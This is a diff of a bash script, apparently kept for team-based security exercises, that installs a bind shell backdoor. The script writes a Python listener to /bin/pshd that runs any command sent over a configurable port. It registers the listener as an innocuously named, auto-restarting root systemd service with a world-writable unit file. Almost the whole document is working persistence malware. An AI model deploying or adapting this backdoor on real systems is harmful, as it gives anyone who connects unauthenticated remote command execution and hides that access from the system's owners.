@@ -1,12 +1,30 @@
 #! /bin/bash
 
+# Creates a bind shell backdoor
+#
+# The script is stored in /bin/pshd
+# A systemd service (pshd.service) is created to run the script
+#
+# Usage:
+# ./blue_python_bind_shell.sh [port]
+# If no port is specified 51337 will be used
+
+PORT="51337"
+if [[ -n "$1" ]]
+then
+PORT=$1
+fi
+
+echo "Creating BIND shell on port $PORT"
+
 # Python Bind Shell
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md#python
-script="import socket as s,subprocess as sp;
+SCRIPT="#! /usr/bin/env python3
+import socket as s,subprocess as sp;
 
 s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
 s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
-s1.bind((\"0.0.0.0\", 51337));
+s1.bind((\"0.0.0.0\", $PORT));
 s1.listen(1);
 c, a = s1.accept();
 
@@ -16,12 +34,13 @@ while True:
     c.sendall(p.stdout.read()+p.stderr.read())"
 
 # Place script at /bin/pshd and set permissions
-echo "$script" > /bin/pshd
+echo "Creating script..."
+echo "$SCRIPT" > /bin/pshd
 chown root /bin/pshd
 chmod 700 /bin/pshd
 
 # Create Systemd Service to execute script
-service="[Unit]
+SERVICE="[Unit]
 Description=PSHD Service
 [Service]
 ExecStart=/usr/bin/python3 /bin/pshd
@@ -31,10 +50,12 @@ Restart=always
 WantedBy=multi-user.target"
 
 # Create service file
-echo "$service" > /etc/systemd/system/pshd.service
+echo "Creating service..."
+echo "$SERVICE" > /etc/systemd/system/pshd.service
 chown root /etc/systemd/system/pshd.service
 chmod 777 /etc/systemd/system/pshd.service
 
 # Enable service
+echo "Enabling service..."
 systemctl enable pshd.service
 systemctl start pshd.service
